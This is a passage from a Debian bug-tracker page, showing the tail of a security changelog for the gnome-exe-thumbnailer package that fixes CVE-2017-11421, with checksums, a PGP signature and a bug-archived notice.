       <a href="http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html">http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html</a>
       (Closes: #868705; LP: #651610; <a href="https://security-tracker.debian.org/tracker/CVE-2017-11421">CVE-2017-11421</a>)
   * Add msitools to recommends; it is now used to fetch .msi version info.
   * Add patch fix-version-label-readability.patch backported from
     <a href="https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1cf4df81836985d9660f950287232b3255ee17bb">https://github.com/gnome-exe-thumbnailer/gnome-exe-thumbnailer/commit/1cf4df81836985d9660f950287232b3255ee17bb</a>
     to fix unreadable white-on-white text on version labels.
Checksums-Sha1:
 5e7a07883b56197e25bdd3a23e2b66740ff2d508 2099 gnome-exe-thumbnailer_0.9.4-2+deb9u1.dsc
 ce5e525d1a614d999c02f220c99d3ee68e9a5111 6096 gnome-exe-thumbnailer_0.9.4-2+deb9u1.debian.tar.xz
 57deb3a84ec4ce9486ec8bc24190d412e309c089 6008 gnome-exe-thumbnailer_0.9.4-2+deb9u1_source.buildinfo
Checksums-Sha256:
 5999ec0cb78928404927cbe660ee26a6a9cb3b3d0d2b7d89bf2b48bd22385dc7 2099 gnome-exe-thumbnailer_0.9.4-2+deb9u1.dsc
 c40e8c596aefd2ef1ffdf6eb08d938fae12b2edc46455cf46fba520bf237e9a6 6096 gnome-exe-thumbnailer_0.9.4-2+deb9u1.debian.tar.xz
 297872ee4722ad8e3cecfa21d9e54ed7fc43183854228e6634491792e0b40db1 6008 gnome-exe-thumbnailer_0.9.4-2+deb9u1_source.buildinfo
Files:
 1ca70c81c6a39c13ccfcf8370b98baaf 2099 gnome optional gnome-exe-thumbnailer_0.9.4-2+deb9u1.dsc
 8410682d3965ab6082aad5673c4a106f 6096 gnome optional gnome-exe-thumbnailer_0.9.4-2+deb9u1.debian.tar.xz
 333aa3fd6bf8d5d4d24e9d564bc784c8 6008 gnome optional gnome-exe-thumbnailer_0.9.4-2+deb9u1_source.buildinfo

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEednFjFDWtapl1TDBdZd4qaNrSU8FAlmKC8UACgkQdZd4qaNr
SU9Kaw/+K8kFXllY8w61T70NSAptBQg9Bn0cYrz4cR2PnLbs0kACuQB9mlJDKs5n
oNobPBj4/uUFx4rpCXAwGOvAhn+rAZR6G7kg/F8aFZJi75dDFxMVGzAewE3gx0L4
TS317qbZpVpPdegQYlPY1UC+AOKefo8Ywh05qQvvqP2pjTzQ7QZQoY8oNa2SXLhR
xK85dUrqcBPAUnFYsZC3Pn+a6dGvy60q1vfUT64L2vngvvXIIiX+1jX7LWUMjRQc
tZ53uwsOguOfjvkfofQCn889+dSd+J9kIDtHVyXlXDxxkY6NV8iBstW+52TXOFeg
baEBY019JQpVit9jPbWJvVy3Pj+Uqj+Me1wbD9W/m5IZ4RVJVuknsUdtpezoEZgf
adwhS4sj+PV1rz1etpk/Z5FUl8D35rVQvYMrBLlzeS3442PgTvHaO0olyawYeFye
dZEH9FPZp3eLTf+kjP2UEy1BggqaDAcBiK6Sxk5376WqsKZjn2LxcWZYcivkAbP9
zm8CS/IYW3ryDPslvCD6ugYOpVm16r8qqxFSAAOZ91hb4MIIm9TFG+VdehWEVK+R
BTcmen4TdZ+nYqlU60A6ERcwG7Let1FwLhfSmv3VjRfH5Qff568R9eIZ/u5688aD
t7HtQgglAtib7pwh1fK+gHKdsm/h4NLtP4J0NneMVq6vUJmPFt8=
=1+jF
-----END PGP SIGNATURE-----



</pre>

<div class="msgreceived"><hr><p>
<a name="52"></a>
<!-- command:archive -->
<!-- requester: Debbugs Internal Request &lt;owner@bugs.debian.org&gt; -->
<!-- request_addr: internal_control@bugs.debian.org -->
<!-- time:1507447490 -->
<!-- new_data:
$new_data = {};
-->
<!-- old_data:
$old_data = {};
-->
<strong>Bug archived.</strong>
Request was from <code>Debbugs Internal Request &lt;owner@bugs.debian.org&gt;</code>
to <code>internal_control@bugs.debian.org</code>.
 (Sun, 08 Oct 2017 07:24:50 GMT) (<a href="bugreport.cgi?bug=868705;msg=53">full text</a>, <a href="bugreport.cgi?bug=868705;mbox=yes;msg=53">mbox</a>, <a href="#52">link</a>).</p></p></div>

<hr>
<p class="msgreceived">Send a report that <a href="https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=868705">this bug log contains spam</a>.</p>
<hr>
<ADDRESS>Debian bug tracking system administrator &lt;<A HREF="mailto:owner@bugs.debian.org">owner@bugs.debian.org</A>&gt;.
Last modified:
<!--timestamp-->Sat Oct 30 18:15:52 2021<!--end timestamp-->; 
Machine Name:
<!--machinename-->bembo<!--machinename-->
<P>
<A HREF="https://www.debian.org/Bugs/">Debian Bug tracking system</A>
</p>
<p>
  Debbugs is free software and licensed under the terms of the GNU
  Public License version 2. The current version can be obtained
  from <a href="https://bugs.debian.org/debbugs-source/">https://bugs.debian.org/debbugs-source/</a>.
</p>
<p>
Copyright  1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.
</p>
</ADDRESS>

</body>
</html>
